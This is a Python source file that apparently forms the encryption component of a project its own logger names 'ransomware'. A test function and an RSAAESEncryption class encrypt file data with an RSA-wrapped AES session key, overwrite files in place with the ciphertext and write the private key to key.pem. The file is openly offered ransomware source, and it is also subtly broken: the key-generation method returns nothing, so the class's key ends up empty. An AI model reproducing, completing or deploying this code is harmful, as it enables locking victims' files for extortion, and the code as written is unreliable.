from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad

import logging

logger = logging.getLogger("ransomware")


RSA_KEY_SIZE = 2048


def encrypt_file():
    data = open("tests/to_encrypt/file", "rb").read()

    file_out = open("tests/encrypted_files/file.bin", "wb+")
    recipient_key = RSA.generate(2048)

    with open("key.pem", "wb+") as pkf:
        pkf.write(recipient_key.export_key())

    # recipient_key = RSA.import_key(open("receiver.pem").read())

    session_key = get_random_bytes(16)

    # Encrypt the session key with the public RSA key
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    # Encrypt the data with the AES session key
    cipher_aes = AES.new(session_key, AES.MODE_CBC)
    ciphertext = cipher_aes.encrypt(pad(data, AES.block_size))

    file_out.write(enc_session_key)
    file_out.write(cipher_aes.iv)
    file_out.write(ciphertext)
    file_out.close()

# class of the same name in src/encrypt.py


class RSAAESEncryption:
    def __init__(self, private_key: str | None = None, **kwargs) -> None:
        self.private_key = private_key or self._generate_rsa_key()
        self.session_key = get_random_bytes(16)

    def _export_key(self):
        """
        Write the private key to a file
        """
        # TODO: Write key in a secure way (e.g. memory-mapped file)
        with open("key.pem", "wb+") as pkf:
            pkf.write(self.private_key.export_key())

    def _generate_rsa_key(self):
        """
        Generate a new RSA key pair
        """
        self.private_key = RSA.generate(RSA_KEY_SIZE)

    def _overwrite_data(self, file_path, enc_session_key: bytes, iv, ciphertext: bytes):
        """
        Write the encrypted data to a file
        """
        with open(file_path, "wb+") as overwrite_f:
            overwrite_f.write(enc_session_key)
            overwrite_f.write(iv)
            overwrite_f.write(ciphertext)
            overwrite_f.close()

    def encrypt(self, dirpath: str, data: bytes) -> bytes:
        """

        """
        self._export_key()
        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(self.private_key)
        enc_session_key = cipher_rsa.encrypt(self.session_key)

        # Encrypt the data with the AES session key
        cipher_aes = AES.new(self.session_key, AES.MODE_CBC)
        ciphertext = cipher_aes.encrypt(pad(data, AES.block_size))
        self._overwrite_data(dirpath, enc_session_key, cipher_aes.iv, ciphertext)